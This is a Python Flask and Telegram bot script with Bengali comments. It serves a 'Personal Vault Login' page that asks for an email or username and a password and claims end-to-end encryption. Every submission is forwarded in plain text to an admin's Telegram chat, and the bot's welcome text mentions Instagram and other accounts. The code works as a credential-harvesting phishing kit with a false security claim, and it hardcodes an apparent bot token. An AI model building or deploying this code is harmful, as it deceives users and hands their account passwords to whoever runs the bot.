import os
import threading
import sys
from flask import Flask, request, render_template_string
from telebot import types
import telebot

# ==========================================
# কনফিগারেশন
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 5428249457))
WEB_URL = os.environ.get("https://hlo-world.onrender.com/")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================================
# ১. কাস্টমাইজড ওয়েবসাইট ডিজাইন (ইনস্টাগ্রামের নয়)
# ==========================================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Vault Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
        .card { background: #1e293b; padding: 40px 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; border: 1px solid #334155; }
        .icon { font-size: 50px; color: #10b981; margin-bottom: 15px; }
        h2 { margin-bottom: 10px; font-weight: 600; color: #e2e8f0; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 13px; color: #cbd5e1; margin-bottom: 5px; }
        input { width: 100%; padding: 12px 15px; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: #fff; font-size: 15px; outline: none; transition: 0.3s; }
        input:focus { border-color: #10b981; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2); }
        button { width: 100%; padding: 14px; background: #10b981; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #059669; }
        .footer { margin-top: 20px; font-size: 12px; color: #64748b; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔐</div>
        <h2>Personal Vault</h2>
        <p>Enter your credentials to save them securely.</p>
        <form method="POST" action="/save">
            <div class="input-group">
                <label>Account Email / Username</label>
                <input type="text" name="email" placeholder="Enter email or username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit">Save to Vault</button>
        </form>
        <div class="footer">
            🛡️ End-to-End Encrypted
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/save', methods=['POST'])
def save_credentials():
    email = request.form.get('email')
    password = request.form.get('password')
    
    if email and password:
        # আপনার (অ্যাডমিনের) টেলিগ্রামে তথ্য পাঠানো
        result_text = (
            f"🔐 **নতুন তথ্য সেভ হয়েছে!**\n"
            f"➖➖➖➖➖➖➖➖➖\n"
            f"📧 **ইমেইল/ইউজার:** `{email}`\n"
            f"🔑 **পাসওয়ার্ড:** `{password}`\n"
            f"➖➖➖➖➖➖➖➖➖\n"
            f"💾 *আপনার তথ্য সফলভাবে সেভ হয়েছে।*"
        )
        bot.send_message(ADMIN_ID, result_text, parse_mode="Markdown")
        
        # সফল মেসেজ দেখানো
        return "<h2 style='color:#10b981; text-align:center; margin-top:20vh; font-family:sans-serif;'>✅ Data Saved Successfully!</h2>"
    
    return "<h2 style='color:red; text-align:center; font-family:sans-serif;'>Error: Fields cannot be empty.</h2>"

# ==========================================
# ২. বট সেটআপ
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != ADMIN_ID:
        return
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌐 Open Personal Vault", url=WEB_URL))
    
    text = (
        "👋 **Welcome Admin!**\n\n"
        "আপনার ইনস্টাগ্রাম বা অন্যান্য অ্যাকাউন্টের তথ্য সেভ করতে নিচের বাটনে ক্লিক করুন।"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

def run_bot():
    print("🤖 Bot is running...")
    bot.infinity_polling()

# ==========================================
# ৩. একসাথে বট ও ওয়েবসাইট রান
# ==========================================
if __name__ == '__main__':
    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
